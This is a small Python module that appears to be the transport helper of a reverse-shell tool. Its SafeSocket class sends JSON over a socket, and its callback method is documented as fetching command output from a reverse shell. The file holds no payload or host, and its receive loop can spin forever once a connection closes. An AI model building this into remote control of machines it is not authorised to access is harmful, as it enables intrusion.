#!/usr/bin/env python3
"""pipe"""
from json import loads, dumps
from socket import socket


class SafeSocket:
    """Transfer data between client and server safely in chunks"""

    def __init__(self, sock: socket) -> None:
        self.sock = sock

    def send(self, data: str) -> None:
        """Parse data to json to reliably send to other machine

        :param data: String to be sent
        """
        json_data = dumps(data)
        self.sock.send(json_data.encode('utf-8'))

    def recv(self) -> str:
        """Append new data and avoid error by continuing to accept it
        bit by bit

        :return: String received from other machine
        """
        data = "".encode('utf-8')
        while True:
            try:
                data = data + self.sock.recv(1024)
                return loads(data)
            except ValueError:
                continue

    def callback(self, data: str) -> str:
        """Used to receive stdout from reverse shell for given command

        :param data:    Command to receive a response with
        :return:        Output of given command
        """
        self.send(data)
        return self.recv()
